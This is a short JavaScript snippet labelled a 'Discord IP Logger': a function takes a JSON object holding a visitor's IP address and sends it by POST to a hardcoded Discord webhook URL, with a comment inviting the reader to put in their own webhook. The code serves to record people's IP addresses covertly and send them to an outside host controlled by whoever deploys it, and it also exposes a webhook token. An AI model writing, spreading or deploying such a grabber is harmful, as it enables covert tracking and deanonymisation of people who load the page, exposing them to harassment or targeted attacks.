function getIP(json) {
  var request = new XMLHttpRequest();
        const Hook = "https://discord.com/api/webhooks/982419138817433650/yjV2KhgtcSR0qZxfy5rjm6BNCnyEj3i8pxVyOiRb3TyvAEhd93AY3NKVcUeZgwBtdhgZ"; // PUT UR WEBHOOK HERE
        var request = new XMLHttpRequest();
        request.open("POST", Hook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Discord IP Logger",
            embeds: [
                { "color": 7506394,
                "title": "IP Logged",
                "description": json.ip
            }]
        }
        request.send(JSON.stringify(params));
    }
